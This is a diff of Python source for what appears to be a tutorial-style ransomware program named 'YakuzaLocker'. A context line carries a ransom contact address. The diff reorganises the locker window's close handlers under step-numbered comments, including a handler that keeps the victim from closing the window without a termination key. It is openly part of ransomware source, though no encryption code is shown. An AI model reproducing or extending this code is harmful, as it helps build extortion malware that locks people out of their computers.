@@ -927,23 +927,6 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
             countdownDialog = CountdownDialog(self, 10, self.close_application)
             countdownDialog.mainloop()
 
-    # Function to close the application
-    def close_application(self):
-        try:
-            self.destroy()
-        except Exception as e:
-            print(f"Exception Happened when closing YakuzaLocker. \nError: {e}")
-
-    # Function to handle window close event
-    def on_close_window(self):
-        dialog = TerminationKeyDialog(self, ICON_PATH)
-        self.wait_window(dialog)
-
-        if dialog.result == TERMINATION_KEY:
-            self.destroy()
-        else:
-            messagebox.showerror("Error", "Incorrect termination key.")
-            return
 
     """ Part 9: Implement Timer and Cleanup Methods 
     from Step 44 to Step 56 """
@@ -954,6 +937,25 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
         countdownDialog.grab_set()
         countdownDialog.mainloop()
 
+    # Step 45: Function to close the application
+    def close_application(self):
+        try:
+            self.destroy()
+        except Exception as e:
+            print(f"Exception Happened when closing YakuzaLocker. \nError: {e}")
+
+    # Step 46: Function to handle window close event
+    def on_close_window(self):
+        # Create Termination Key Dialog to give TERMINATION_KEY from user
+        dialog = TerminationKeyDialog(self, ICON_PATH)
+        self.wait_window(dialog)
+
+        # if user submit TERMINATION_KEY correct, then close(destroy) app
+        if dialog.result == TERMINATION_KEY:
+            self.destroy()
+        else:
+            messagebox.showerror("Error", "Incorrect termination key.")
+            return
 
 
 
